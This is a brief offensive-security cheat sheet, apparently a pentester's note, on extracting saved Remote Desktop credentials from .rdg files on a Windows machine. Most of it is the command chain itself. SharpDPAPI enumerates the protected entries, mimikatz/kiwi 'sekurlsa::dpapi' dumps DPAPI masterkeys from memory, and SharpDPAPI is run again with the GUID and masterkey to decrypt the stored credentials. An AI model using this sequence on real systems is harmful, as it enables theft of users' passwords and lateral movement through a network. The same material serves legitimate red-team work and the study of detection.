# Via RDP 
- Find the .rdg file in system
- Use SharpDPAPI.exe
- Things to note
  - Need masterkey and sha
  - Gather from kiwi or mimitkaz

- Enumerate GUID
```
SharpDPAPI.exe rdg /unprotected
```
- Find and Dump GUID Masterkey with kiwi
```
kiwi_cmd sekurlsa::dpapi
```
- Utlize the GUID and Masterkey to gain Credentials
```
SharpDPAPI.exe rdg GUID:sha(masterkey)
```
